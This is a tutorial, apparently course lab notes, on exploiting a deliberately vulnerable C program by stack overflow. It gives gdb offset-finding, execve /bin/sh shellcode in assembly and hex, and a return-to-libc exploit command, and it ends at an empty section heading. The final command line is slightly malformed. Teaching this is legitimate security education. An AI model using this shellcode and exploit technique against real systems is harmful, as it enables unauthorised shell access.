#*Buffer Overflows Two Ways*

##vulnerable.c
```
#include <stdio.h>

int main(int argc, char *argv[]){
	char buf[256];
	memcpy(buf, argv[1], strlen(argv[1]));
	printf(buf);
}
```
Ensure you've disabled ASLR `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`

Compile vulnerable.c `gcc -fno-stack-protector vulnerable.c -o vulnerable`

###1. Pinpoint Return Address

Since this is a simple program we can use the following manual approach. Fire up gdb `gdb vulnerable`

Lets go ahead and overflow `buf`

`(gdb) r $(python -c 'print "A"*269')`

Output:

```
Starting program: /home/amilkov3/Dropbox/CS6035/Project1/vulnerable $(python -c 'print "A"*269')

Program received signal SIGSEGV, Segmentation fault.
0xb7e2fa41 in __libc_start_main (main=0x804847d <main>, argc=2, 
    argv=0xbffff034, init=0x80484d0 </__libc_csu_init>, 
    fini=0x8048540 <__libc_csu_fini>, rtld_fini=0xb7fed180 <_dl_fini>, 
    stack_end=0xbffff02c) at libc-start.c:274
274	libc-start.c: No such file or directory.
```
Keep adding A's until you fill the return address entirely with them like so:

`(gdb) r $(python -c 'print "A"*272')`

```
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/amilkov3/Dropbox/CS6035/Project1/vulnerable $(python -c 'print "A"*272')

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

0x41414141 tells us we've filled the entire return address with the hexadecimal representation of A: 0x41. So essentially now we know we need 272 bytes to fill the return address. Let's get on to writing our shellcode

#Stack Type
From here we can go down 2 roads. If your system has a executable stack we can write our buffer overflow exploit the old school way. If your stack is non-executable skip to to 2b

###2a. Shellcode Construction

We need to write assembly that will execute the `execve(const char *filename, char *const argv[], char *const envp[]);` system call. (Assuming an x86 architecture)
##spawn_shell.nasm
```
global_start

section .text

_start:

	; PUSH 0x00000000 on the Stack
	xor eax, eax
	push eax

	; PUSH //bin/sh in reverse i.e. hs/nib//
	push 0x68732f6e
	push 0x69622f2f

	; Make EBX point to //bin/sh on the Stack using ESP
	mov ebx, esp

	; PUSH 0x00000000 using EAX and point EDX to it using ESP
	push eax
	mov edx, esp 

	; PUSH Address of //bin/sh on the Stack and make ECX point to it using ESP
	push ebx
	mov ecx, esp

	; EAX = 0, Move 11 (system call number for execve) into AL to avoid nulls in the shellcode
	mov al, 11
	int 0x80 
```

Assembly, link and test the code to ensure it spawns a shell

```
comp-name # nasm -f	elf32 spawn_shell.nasm -o spawn_shell.o
comp-name # ld spawn_shell.o -o spawn_shell
comp-name # ./spawn_shell
$
```

Now `objdump` to get the hexcode: `objdump -d spawn_shell -M intel`

```
testShell:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:	31 c0                	xor    eax,eax
 8048062:	50                   	push   eax
 8048063:	68 6e 2f 73 68       	push   0x68732f6e
 8048068:	68 2f 2f 62 69       	push   0x69622f2f
 804806d:	89 e3                	mov    ebx,esp
 804806f:	50                   	push   eax
 8048070:	89 e2                	mov    edx,esp
 8048072:	53                   	push   ebx
 8048073:	89 e1                	mov    ecx,esp
 8048075:	b0 0b                	mov    al,0xb
 8048077:	cd 80                	int    0x80
```

Corresponding shell code: `\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80`

###3a. Shellcode Injection

Now that we have out shellcode, here's a high level view of what we want to do with it

| Before overflow |
|-----------------|
| arg2            (higher addresses)|	
| arg1            |
| return address  |
| ebp             |
| buf[]           (lower addresses\)|


| After overflow       |
|----------------------|
| arg2                 |
| arg1                 |
| address of shellcode |
| shellcode            |
| NOPS      |

Essentially what we need to determine is "address of shellcode" or a suitable address from where we can enter our NOP sled and hit and execute our shellcode


###2b. Return to libc syscall

Since we have a non-executable stack, we will still overwrite the return address except with one of the functions located in libc, passing to it the necessary arguments, and execute it. We bypass stack protection because these functions are not located on the stack

| Before overflow |
|-----------------|
| arg2            (higher addresses)|	
| arg1            |
| return address  |
| ebp             |
| buf[]           (lower addresses\)|

| After overflow       |
|----------------------|
| 'sh' address         |
| fake_return          |
| EBP: system_address |
| buf[]                |

Already know we need 272 bytes to overwrite the return address so lets fire up gdb to find out the address of the libc `system()` call and an address for string 'sh': `gdb vulnerable`

<pre>
(gdb) b main
Breakpoint 1 at 0x8048489: file vulnerable.c, line 5.
(gdb) r
Starting program: /home/amilkov3/Dropbox/CS6035/Project1/Extraneous/vulnerable 

Breakpoint 1, main (argc=1, argv=0xbffff124) at vulnerable.c:5
5		memcpy(buf, argv[1], strlen(argv[1]));
(gdb) p system
$1 = {<text variable, no debug info>} <b>0xb7e56190</b> <__libc_system>
(gdb) info files
Symbols from "/home/amilkov3/Dropbox/CS6035/Project1/Extraneous/vulnerable".
Unix child process:
	Using the running image of child process 2373.
	While running this, GDB does not access memory from...
Local exec file:
	`/home/amilkov3/Dropbox/CS6035/Project1/Extraneous/vulnerable', 
        file type elf32-i386.
	Entry point: 0x8048380
	0x08048154 - 0x08048167 is .interp
	0x08048168 - 0x08048188 is .note.ABI-tag
	0x08048188 - 0x080481ac is .note.gnu.build-id
	0x080481ac - 0x080481cc is .gnu.hash
	0x080481cc - 0x0804823c is .dynsym
	0x0804823c - 0x08048296 is .dynstr
	0x08048296 - 0x080482a4 is .gnu.version
	0x080482a4 - 0x080482c4 is .gnu.version_r
	0x080482c4 - 0x080482cc is .rel.dyn
	0x080482cc - 0x080482f4 is .rel.plt
	0x080482f4 - 0x08048317 is .init
	0x08048320 - 0x08048380 is .plt
	0x08048380 - 0x08048542 is .text
	0x08048544 - 0x08048558 is .fini
	0x08048558 - 0x08048560 is .rodata
	0x08048560 - 0x0804858c is .eh_frame_hdr
	0x0804858c - 0x0804863c is .eh_frame
	0x08049f08 - 0x08049f0c is .init_array
	0x08049f0c - 0x08049f10 is .fini_array
---Type <return> to continue, or q <return> to quit---
	0x08049f10 - 0x08049f14 is .jcr
	0x08049f14 - 0x08049ffc is .dynamic
	0x08049ffc - 0x0804a000 is .got
	0x0804a000 - 0x0804a020 is .got.plt
	0x0804a020 - 0x0804a028 is .data
	0x0804a028 - 0x0804a02c is .bss
	0xb7fde114 - 0xb7fde138 is .note.gnu.build-id in /lib/ld-linux.so.2
	0xb7fde138 - 0xb7fde1f8 is .hash in /lib/ld-linux.so.2
	0xb7fde1f8 - 0xb7fde2dc is .gnu.hash in /lib/ld-linux.so.2
	0xb7fde2dc - 0xb7fde4ac is .dynsym in /lib/ld-linux.so.2
	0xb7fde4ac - 0xb7fde642 is .dynstr in /lib/ld-linux.so.2
	0xb7fde642 - 0xb7fde67c is .gnu.version in /lib/ld-linux.so.2
	0xb7fde67c - 0xb7fde744 is .gnu.version_d in /lib/ld-linux.so.2
	0xb7fde744 - 0xb7fde7b4 is .rel.dyn in /lib/ld-linux.so.2
	0xb7fde7b4 - 0xb7fde7e4 is .rel.plt in /lib/ld-linux.so.2
	0xb7fde7f0 - 0xb7fde860 is .plt in /lib/ld-linux.so.2
	0xb7fde860 - 0xb7ff67ac is .text in /lib/ld-linux.so.2
	0xb7ff67c0 - 0xb7ffa7a0 is .rodata in /lib/ld-linux.so.2
	0xb7ffa7a0 - 0xb7ffae24 is .eh_frame_hdr in /lib/ld-linux.so.2
	0xb7ffae24 - 0xb7ffd71c is .eh_frame in /lib/ld-linux.so.2
	0xb7ffecc0 - 0xb7ffef34 is .data.rel.ro in /lib/ld-linux.so.2
	0xb7ffef34 - 0xb7ffefec is .dynamic in /lib/ld-linux.so.2
	0xb7ffefec - 0xb7ffeff8 is .got in /lib/ld-linux.so.2
---Type <return> to continue, or q <return> to quit---
	0xb7fff000 - 0xb7fff024 is .got.plt in /lib/ld-linux.so.2
	0xb7fff040 - 0xb7fff878 is .data in /lib/ld-linux.so.2
	0xb7fff878 - 0xb7fff938 is .bss in /lib/ld-linux.so.2
	0xb7e16174 - 0xb7e16198 is .note.gnu.build-id in /lib/i386-linux-gnu/libc.so.6
	0xb7e16198 - 0xb7e161b8 is .note.ABI-tag in /lib/i386-linux-gnu/libc.so.6
	0xb7e161b8 - 0xb7e19ec8 is .gnu.hash in /lib/i386-linux-gnu/libc.so.6
	0xb7e19ec8 - 0xb7e23438 is .dynsym in /lib/i386-linux-gnu/libc.so.6
	0xb7e23438 - 0xb7e2915e is .dynstr in /lib/i386-linux-gnu/libc.so.6
	0xb7e2915e - 0xb7e2a40c is .gnu.version in /lib/i386-linux-gnu/libc.so.6
	0xb7e2a40c - 0xb7e2a898 is .gnu.version_d in /lib/i386-linux-gnu/libc.so.6
	0xb7e2a898 - 0xb7e2a8d8 is .gnu.version_r in /lib/i386-linux-gnu/libc.so.6
	0xb7e2a8d8 - 0xb7e2d2e8 is .rel.dyn in /lib/i386-linux-gnu/libc.so.6
	0xb7e2d2e8 - 0xb7e2d348 is .rel.plt in /lib/i386-linux-gnu/libc.so.6
	0xb7e2d350 - 0xb7e2d420 is .plt in /lib/i386-linux-gnu/libc.so.6
	0xb7e2d420 - 0xb7f5eb6e is .text in /lib/i386-linux-gnu/libc.so.6
	0xb7f5eb70 - 0xb7f5fafb is __libc_freeres_fn in /lib/i386-linux-gnu/libc.so.6
	0xb7f5fb00 - 0xb7f5fcfe is __libc_thread_freeres_fn in /lib/i386-linux-g---Type <return> to continue, or q <return> to quit---
nu/libc.so.6
	0xb7f5fd00 - 0xb7f81754 is .rodata in /lib/i386-linux-gnu/libc.so.6
	0xb7f81754 - 0xb7f81767 is .interp in /lib/i386-linux-gnu/libc.so.6
	0xb7f81768 - 0xb7f88c0c is .eh_frame_hdr in /lib/i386-linux-gnu/libc.so.6
	0xb7f88c0c - 0xb7fb9f68 is .eh_frame in /lib/i386-linux-gnu/libc.so.6
	0xb7fb9f68 - 0xb7fba3c6 is .gcc_except_table in /lib/i386-linux-gnu/libc.so.6
	0xb7fba3c8 - 0xb7fbd928 is .hash in /lib/i386-linux-gnu/libc.so.6
	0xb7fbe1d4 - 0xb7fbe1dc is .tdata in /lib/i386-linux-gnu/libc.so.6
	0xb7fbe1dc - 0xb7fbe220 is .tbss in /lib/i386-linux-gnu/libc.so.6
	0xb7fbe1dc - 0xb7fbe1e8 is .init_array in /lib/i386-linux-gnu/libc.so.6
	0xb7fbe1e8 - 0xb7fbe260 is __libc_subfreeres in /lib/i386-linux-gnu/libc.so.6
	0xb7fbe260 - 0xb7fbe264 is __libc_atexit in /lib/i386-linux-gnu/libc.so.6
	0xb7fbe264 - 0xb7fbe274 is __libc_thread_subfreeres in /lib/i386-linux-gnu/libc.so.6
	0xb7fbe280 - 0xb7fbfda8 is .data.rel.ro in /lib/i386-linux-gnu/libc.so.6
	0xb7fbfda8 - 0xb7fbfe98 is .dynamic in /lib/i386-linux-gnu/libc.so.6
	0xb7fbfe98 - 0xb7fbfff4 is .got in /lib/i386-linux-gnu/libc.so.6
	0xb7fc0000 - 0xb7fc003c is .got.plt in /lib/i386-linux-gnu/libc.so.6
---Type <return> to continue, or q <return> to quit---
	0xb7fc0040 - 0xb7fc0ebc is .data in /lib/i386-linux-gnu/libc.so.6
	0xb7fc0ec0 - 0xb7fc3a7c is .bss in /lib/i386-linux-gnu/libc.so.6
(gdb) find 0xb7ff67c0,0xb7ffa7a0,'sh'
Invalid character constant.
(gdb) find 0xb7ff67c0,0xb7ffa7a0,"sh"
0xb7ff7e5c <__PRETTY_FUNCTION__.9595+12>
1 pattern found.
(gdb) x/s 0xb7ff7e5c
<b>0xb7ff7e5c</b> <__PRETTY_FUNCTION__.9595+12>:	"sh"
</pre>

The addresses in bold are the ones we are interested in. Namely on this example machine:

0xb7e56190 is the address of system()

0xb7ff7e5c is the address of 'sh'

##3b. Writing the exploit

All we need to do now is append these 2 addresses to the end of our string of A's in order to call essentially call `system('sh')` and spawn a shell

Here's what little math we need:

- Smashing EIP: 272 - 4 = 268 'A's needed
- Append system() -> "\x90\x61\xe5\xb7" * 2 since we need to fill the return address as well
- Append 'sh' -> "\x5c\x7e\xff\xb7"

On the command line:

`comp-name # ./vulnerable $(python -c 'A'*268 + "\x90\x61\xe5\xb7\x90\x61\xe5\xb7\x5c\x7e\xff\xb7"`

Verify that you spawned the shell

##4b. Exiting cleanly